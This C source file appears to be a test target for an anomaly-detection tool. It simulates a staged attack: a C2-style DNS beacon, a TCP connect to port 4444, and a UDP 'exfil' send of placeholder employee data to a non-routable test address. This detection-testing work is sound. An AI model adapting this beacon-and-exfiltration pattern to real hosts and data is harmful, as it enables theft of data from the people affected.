/*
 * targetProc2.c — Full Network Threat Simulation
 *
 * Simulates a three-stage network threat behavior for use as a
 * Scrutiny anomaly detection target:
 *
 *   Stage 1 (iter 20): DNS-style hostname resolution — recon/C2 beacon pattern
 *   Stage 2 (iter 40): TCP connect to external IP — exfil channel establishment
 *   Stage 3 (iter 60): Socket open + data send + close — active exfil cycle
 *
 * Shares the same baseline behavior as targetProc0 (file I/O, PID checks,
 * time queries) so that network syscalls stand out cleanly against the
 * established baseline.
 *
 * Part of the Scrutiny project — HoneyBadger Vanguard fork.
 * Inspired by the original work of CommonTongue-InfoSec.
 * https://github.com/CommonTongue-InfoSec/Scrutiny
 */

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define LOG_FILE        "payroll.log"
#define RUN_DURATION    120
#define LOOP_INTERVAL   1
#define DATA_FILE       "employees.txt"

/* Simulated C2 / exfil targets — non-routable/benign for safe lab use */
#define C2_HOSTNAME     "c2.internal.lab"
#define EXFIL_IP        "192.0.2.1"         /* RFC 5737 TEST-NET — never routes */
#define EXFIL_PORT      4444
#define EXFIL_PAYLOAD   "EXFIL|employees.txt|Employee1,40|Employee2,35"

/* Stage trigger iterations */
#define STAGE1_ITER     20      /* DNS beacon */
#define STAGE2_ITER     40      /* TCP connect */
#define STAGE3_ITER     60      /* Full exfil send */

volatile sig_atomic_t keep_running = 1;

void handle_sigint(int sig)
{
    keep_running = 0;
}

/*
 * stage1_dns_beacon()
 * Simulates a C2 beacon via hostname resolution.
 * Syscalls: socket, connect (via getaddrinfo internals), close
 */
static void stage1_dns_beacon(void)
{
    printf("targetProc2: [STAGE 1] DNS beacon — resolving '%s'\n", C2_HOSTNAME);

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int rc = getaddrinfo(C2_HOSTNAME, NULL, &hints, &res);
    if (rc != 0)
    {
        /* Expected in lab — hostname won't resolve. Syscalls still fired. */
        fprintf(stderr, "targetProc2: [STAGE 1] DNS resolution failed (expected): %s\n",
                gai_strerror(rc));
    }
    else
    {
        printf("targetProc2: [STAGE 1] DNS resolved '%s'\n", C2_HOSTNAME);
        freeaddrinfo(res);
    }
}

/*
 * stage2_tcp_connect()
 * Simulates establishing an exfil channel via TCP connect.
 * Uses SO_SNDTIMEO (2s) so connect() fails fast and doesn't block
 * the main loop — Stage 3 must still fire within the run window.
 * Syscalls: socket, setsockopt, connect, close
 */
static void stage2_tcp_connect(void)
{
    printf("targetProc2: [STAGE 2] TCP connect -- %s:%d\n", EXFIL_IP, EXFIL_PORT);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        fprintf(stderr, "targetProc2: [STAGE 2] socket() failed: %s\n", strerror(errno));
        return;
    }

    /* 2-second connect timeout — prevents blocking the full run window */
    struct timeval tv;
    tv.tv_sec  = 2;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family      = AF_INET;
    target.sin_port        = htons(EXFIL_PORT);
    target.sin_addr.s_addr = inet_addr(EXFIL_IP);

    /* connect() will fail fast — RFC 5737 address never routes. Syscall still fires. */
    int rc = connect(sockfd, (struct sockaddr *)&target, sizeof(target));
    if (rc == -1)
    {
        fprintf(stderr, "targetProc2: [STAGE 2] connect() failed (expected): %s\n",
                strerror(errno));
    }
    else
    {
        printf("targetProc2: [STAGE 2] TCP channel established\n");
    }

    close(sockfd);
}

/*
 * stage3_exfil_send()
 * Simulates a full exfil cycle: socket open → send → close.
 * Uses UDP to fire sendto() even without a live listener.
 * Syscalls: socket, sendto, close
 */
static void stage3_exfil_send(void)
{
    printf("targetProc2: [STAGE 3] Exfil send — payload: \"%s\"\n", EXFIL_PAYLOAD);

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1)
    {
        fprintf(stderr, "targetProc2: [STAGE 3] socket() failed: %s\n", strerror(errno));
        return;
    }

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family      = AF_INET;
    target.sin_port        = htons(EXFIL_PORT);
    target.sin_addr.s_addr = inet_addr(EXFIL_IP);

    ssize_t sent = sendto(sockfd,
                          EXFIL_PAYLOAD,
                          strlen(EXFIL_PAYLOAD),
                          0,
                          (struct sockaddr *)&target,
                          sizeof(target));

    if (sent == -1)
    {
        fprintf(stderr, "targetProc2: [STAGE 3] sendto() failed: %s\n", strerror(errno));
    }
    else
    {
        printf("targetProc2: [STAGE 3] %zd bytes sent\n", sent);
    }

    close(sockfd);
}

int main(void)
{
    signal(SIGINT, handle_sigint);
    srand(time(NULL));

    time_t start_time = time(NULL);
    printf("targetProc2: Starting (PID %d), will run for ~%d seconds\n",
           getpid(), RUN_DURATION);

    /* Shared baseline setup — mirrors targetProc0 */
    int fd = open(DATA_FILE, O_CREAT | O_WRONLY, 0644);
    if (fd != -1)
    {
        write(fd, "Employee1,40\nEmployee2,35\n", 27);
        close(fd);
    }
    else
    {
        fprintf(stderr, "targetProc2: Error creating %s: %s\n", DATA_FILE, strerror(errno));
    }

    int iter = 0;
    while (keep_running)
    {
        if (difftime(time(NULL), start_time) >= RUN_DURATION)
            break;

        /* --- Baseline behavior (mirrors targetProc0) --- */

        /* Time check */
        time_t current_time = time(NULL);
        printf("targetProc2: Current time %ld\n", current_time);

        /* PID check */
        if (rand() % 2 == 0)
            printf("targetProc2: Checked PID %d\n", getpid());

        /* File I/O */
        if (rand() % 2)
        {
            int logfd = open(LOG_FILE, O_CREAT | O_WRONLY | O_APPEND, 0644);
            if (logfd != -1)
            {
                close(logfd);
                printf("targetProc2: Opened and closed %s\n", LOG_FILE);
            }
        }

        /* --- Staged threat behavior --- */

        if (iter == STAGE1_ITER)
            stage1_dns_beacon();

        if (iter == STAGE2_ITER)
            stage2_tcp_connect();

        if (iter == STAGE3_ITER)
            stage3_exfil_send();

        iter++;
        sleep(LOOP_INTERVAL);
    }

    printf("targetProc2: Exiting after ~%d seconds\n", RUN_DURATION);
    return 0;
}
